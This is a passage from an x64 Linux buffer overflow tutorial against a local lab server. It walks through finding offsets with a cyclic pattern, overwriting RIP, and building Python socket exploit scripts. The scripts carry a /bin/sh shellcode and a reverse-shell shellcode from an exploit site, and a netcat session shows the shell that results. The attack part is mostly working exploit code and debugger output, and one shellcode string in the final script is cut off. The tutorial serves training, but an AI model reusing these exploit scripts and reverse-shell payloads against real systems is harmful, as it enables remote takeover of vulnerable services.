+0x7fffffffdc18  0x41346b41 0x6b41356b 0x376b4136 0x41386b41  Ak4Ak5Ak6Ak7Ak8A
+0x7fffffffdc28  0x6c41396b 0x316c4130 0x41326c41 0x6c41336c  k9Al0Al1Al2Al3Al
+0x7fffffffdc38  0x356c4134 0x41366c41 0x6c41376c             4Al5Al6Al7Al
+```
+And we use the same tool, by copying and pasting those hex values:
+```
+lab@lab-VirtualBox:~/exploit-pattern$ python3 pattern.py 0x37674136
+Pattern 0x37674136 first occurrence at position 200 in pattern.
+
+lab@lab-VirtualBox:~/exploit-pattern$ python3 pattern.py 0x6241376241366241
+Pattern 0x6241376241366241 first occurrence at position 48 in pattern.
+```
+And now, as we know the positions of our payload where we overwrite specific values, we can try to land some marks in there to make sure we do have full control on them:
+```
+from struct import pack
+import socket
+import sys
+
+rip = 0x7fffffffdba8
+
+payload = b"\x41"*48 + b"\x90"*8 + b"B"*8 + b"\x90"*170 + b"\xCC"*200 +b"\x90"*800 
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect = s.connect(('127.0.0.1',8081))
+s.send(payload)
+
+s.close()
+```
+We launch the script again, check the registers and:
+
+```
+[0x555555554b3d]> dr
+rax = 0x41414141
+rbx = 0x00000000
+rcx = 0x7ffff7a98650
+rdx = 0x00000059
+r8 = 0x00000000
+r9 = 0x00000000
+r10 = 0x00000000
+r11 = 0x7ffff7b912c0
+r12 = 0x5555555549b0
+r13 = 0x7fffffffe0b0
+r14 = 0x00000000
+r15 = 0x00000000
+rsi = 0x5555555552a0
+rdi = 0x7fffffffdae0
+rsp = 0x7fffffffdb18
+rbp = 0x9090909090909090
+rip = 0x555555554b3d
+rflags = 0x00010286
+orax = 0xffffffffffffffff
+[0x555555554b3d]> pxw @ rsp
+0x7fffffffdb18  0x42424242 0x42424242 0x90909090 0x90909090  BBBBBBBB........
+0x7fffffffdb28  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdb38  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdb48  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdb58  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdb68  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdb78  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdb88  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdb98  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdba8  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdbb8  0x90909090 0x90909090 0x90909090 0x90909090  ................
+0x7fffffffdbc8  0xcccc9090 0xcccccccc 0xcccccccc 0xcccccccc  ................
+0x7fffffffdbd8  0xcccccccc 0xcccccccc 0xcccccccc 0xcccccccc  ................
+0x7fffffffdbe8  0xcccccccc 0xcccccccc 0xcccccccc 0xcccccccc  ................
+0x7fffffffdbf8  0xcccccccc 0xcccccccc 0xcccccccc 0xcccccccc  ................
+```
+Awesome, we control the stack, RBP and we have room for our shellcode.
+
+So from now, we have it clear that, for example a nice place to start landing shellcode in memory will be the position: 0x7fffffffdba8 why? because we can start writing there, it can be 2 bytes after or before in our case, we select that because it makes a nice 200 padding thats all.
+
+So we will want the RIP register to point 0x7fffffffdba8 after the crash. How to do it? As we have control over RBP, we know that the 64 bits after the stack frame contain the return value, when the function returns, the return value is popped into RIP, so the program can resume execution of the calling function. We know that the value of the "saved frame/base pointer" will be overwritten past the first 48 bytes, the "saved return address" goes right after so 48+8 bytes and then we overwritte the "saved return address" that will go into RIP, so we write the address of our shellcode in there:
+
+Also remember, that when you send a buffer/chunk that needs to be interpreted as a memory address, you need to check for the endianness, Little Endian in this case. [Read about it](https://embetronicx.com/tutorials/p_language/c/little-endian-and-big-endian/)
+
+Se we'll send a buffer, for the overfflow, then the RIP address then some nops and \xCC (opcode for breakpoint, so we can pause the program and see if it's working)
+
+``` 
+rip = 0x7fffffffdba8
+
+payload = b"\x41"*48 + b"\x90"*8 + pack("<Q", rip) + b"\x90"*170 + b"\xCC"*200 +b"\x90"*800 
+```
+We send that and:
+
+```
+[0x7ffff7dd4090]> dc
+Waiting for connections...
+Got connection!
+[0x7fffffffdc1b]> 
+
+[0x7fffffffdc1b]> pd 10
+            ;-- rip:
+            0x7fffffffdc1b      cc             int3
+            0x7fffffffdc1c      cc             int3
+            0x7fffffffdc1d      cc             int3
+            0x7fffffffdc1e      cc             int3
+            0x7fffffffdc1f      cc             int3
+            0x7fffffffdc20      cc             int3
+            0x7fffffffdc21      cc             int3
+            0x7fffffffdc22      cc             int3
+            0x7fffffffdc23      cc             int3
+            0x7fffffffdc24      cc             int3
+[0x7fffffffdc1b]> 
+```
+RIP gets overwritten and we jump right into our shellcode. Right now it is all breakpoints, so nothing gets executed though we now have full control of the execution.
+
+
+At this point you'll usually want to run shellcode, something useful, run some program, install malware, run a reverse shell etc. Sites like exploit-db, packetstormsecurity or a bunch of github sites do contain shellcode you can read and integrate. Here I'll start by using a simple /bin/sh shellcode:
+
+```
+0000000000400080 <_start>:
+  400080:	50                   	push   %rax
+  400081:	48 31 d2             	xor    %rdx,%rdx
+  400084:	48 31 f6             	xor    %rsi,%rsi
+  400087:	48 bb 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rbx
+  40008e:	2f 73 68 
+  400091:	53                   	push   %rbx
+  400092:	54                   	push   %rsp
+  400093:	5f                   	pop    %rdi
+  400094:	b0 3b                	mov    $0x3b,%al
+  400096:	0f 05                	syscall
+
+\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
+```
+We can basically copy and paste the hex, after understanding it:
+```
+[0x7fffffffdc13]> ds
+[0x7fffffffdc13]> pd 10
+            0x7fffffffdc13      cc             int3
+            0x7fffffffdc14      cc             int3
+            0x7fffffffdc15      cc             int3
+            0x7fffffffdc16      cc             int3
+            0x7fffffffdc17      cc             int3
+            0x7fffffffdc18      cc             int3
+            ;-- rip:
+            0x7fffffffdc19      cc             int3
+            0x7fffffffdc1a      50             push rax
+            0x7fffffffdc1b      4831d2         xor rdx, rdx
+            0x7fffffffdc1e      4831f6         xor rsi, rsi
+[0x7fffffffdc13]> 
+```
+And we see how those int3 instructions go right before the shellcode now.
+
+We can jump into something more advanced, like a reverse shell [I took from here](https://packetstormsecurity.com/files/160996/Linux-x64-Reverse-Shell-Shellcode.html)
+```
+0:  6a 29                  push   0x29
+   2:  58                     pop    rax
+   3:  6a 02                  push   0x2
+   5:  5f                     pop    rdi
+   6:  6a 01                  push   0x1
+   8:  5e                     pop    rsi
+   9:  99                     cdq    
+   a:  0f 05                  syscall 
+   c:  50                     push   rax
+   d:  5f                     pop    rdi
+   e:  52                     push   rdx
+   f:  68 7f 01 01 01         push   0x101017f
+  14:  66 68 11 5c            pushw  0x5c11
+  18:  66 6a 02               pushw  0x2
+  1b:  6a 2a                  push   0x2a
+  1d:  58                     pop    rax
+  1e:  54                     push   rsp
+  1f:  5e                     pop    rsi
+  20:  6a 10                  push   0x10
+  22:  5a                     pop    rdx
+  23:  0f 05                  syscall 
+  25:  6a 02                  push   0x2
+  27:  5e                     pop    rsi
+  28:  6a 21                  push   0x21
+  2a:  58                     pop    rax
+  2b:  0f 05                  syscall 
+  2d:  48 ff ce               dec    rsi
+  30:  79 f6                  jns    28 <loop_1>
+  32:  6a 01                  push   0x1
+  34:  58                     pop    rax
+  35:  49 b9 50 61 73 73 77   movabs r9,0x203a647773736150
+  3c:  64 3a 20 
+  3f:  41 51                  push   r9
+  41:  54                     push   rsp
+  42:  5e                     pop    rsi
+  43:  6a 08                  push   0x8
+  45:  5a                     pop    rdx
+  46:  0f 05                  syscall 
+  48:  48 31 c0               xor    rax,rax
+  4b:  48 83 c6 08            add    rsi,0x8
+  4f:  0f 05                  syscall 
+  51:  48 b8 31 32 33 34 35   movabs rax,0x3837363534333231
+  58:  36 37 38 
+  5b:  56                     push   rsi
+  5c:  5f                     pop    rdi
+  5d:  48 af                  scas   rax,QWORD PTR es:[rdi]
+  5f:  75 1a                  jne    7b <exit_program>
+  61:  6a 3b                  push   0x3b
+  63:  58                     pop    rax
+  64:  99                     cdq    
+  65:  52                     push   rdx
+  66:  48 bb 2f 62 69 6e 2f   movabs rbx,0x68732f2f6e69622f
+  6d:  2f 73 68 
+  70:  53                     push   rbx
+  71:  54                     push   rsp
+  72:  5f                     pop    rdi
+  73:  52                     push   rdx
+  74:  54                     push   rsp
+  75:  5a                     pop    rdx
+  76:  57                     push   rdi
+  77:  54                     push   rsp
+  78:  5e                     pop    rsi
+  79:  0f 05                  syscall 
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[]= \
+"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x05\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x51\x54\x5e\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1a\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05";
+
+void main()
+{
+  printf("ShellCode Length: %d\n", strlen(code));
+  int (*ret)() = (int(*)())code;
+  ret();
+
+```
+And that can be integrated into our initial exploit like this:
+```
+from struct import pack
+import socket
+import sys
+
+
+rip = 0x7fffffffdba8
+
+sc = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
+revshell = b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x0 ...
+
+payload = b"\x41"*48 + b"\x90"*8 + pack("<Q", rip) + b"\x90"*162 + b"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC" + revshell +b"\x90"*800 
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect = s.connect(('127.0.0.1',8081))
+s.send(payload)
+
+s.close()
+
+```
+And then, as we see, it gets executed:
+
+```
+[0x7fffffffdc13]> pd 10
+            ;-- rip:
+            0x7fffffffdc13      cc             int3
+            0x7fffffffdc14      cc             int3
+            0x7fffffffdc15      cc             int3
+            0x7fffffffdc16      cc             int3
+            0x7fffffffdc17      cc             int3
+            0x7fffffffdc18      cc             int3
+            0x7fffffffdc19      cc             int3
+            0x7fffffffdc1a      6a29           push 0x29               ; ')' ; section_end..comment
+            0x7fffffffdc1c      58             pop rax
+            0x7fffffffdc1d      6a02           push 2                  ; 2
+[0x7fffffffdc13]> pd 20
+            ;-- rip:
+            0x7fffffffdc13      cc             int3
+            0x7fffffffdc14      cc             int3
+            0x7fffffffdc15      cc             int3
+            0x7fffffffdc16      cc             int3
+            0x7fffffffdc17      cc             int3
+            0x7fffffffdc18      cc             int3
+            0x7fffffffdc19      cc             int3
+            0x7fffffffdc1a      6a29           push 0x29               ; ')' ; section_end..comment
+            0x7fffffffdc1c      58             pop rax
+            0x7fffffffdc1d      6a02           push 2                  ; 2
+            0x7fffffffdc1f      5f             pop rdi
+            0x7fffffffdc20      6a01           push 1                  ; 1
+            0x7fffffffdc22      5e             pop rsi
+            0x7fffffffdc23      99             cdq
+            0x7fffffffdc24      0f05           syscall
+            0x7fffffffdc26      50             push rax
+            0x7fffffffdc27      5f             pop rdi
+```
+Granting us full access to a reverse shell :)
+```
+^V^Clab@lab-VirtualBox:~/exploit-pattern$ nc -lvp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from localhost 49124 received!
+Passwd: 12345678
+ls
+ls -lah
+ps
+pwd
+Downloads
+Documents
+Desktop
+```
+And ending this tutorial...
+
+
+This has been a very basic tutorial, acting like a warm up for what is about to come. Please understand that we all do start from the very beggining at some point and this is necessary to build advanced stuff on top of it.
+
+I hope it becomes useful for you guys. As a challenge I dare you to chance the C code to make the SOCKET FILE DESCRIPTOR a global variable and teak your exploit to trigger the EGG function :)
+
+
+If yoou want to read more about x64 buffer overflows on Linux, check this out
+
+[Buffer Overflow x64](https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558)
+[More about buffer overflows on x64](https://samsclass.info/127/proj/ED402.htm)
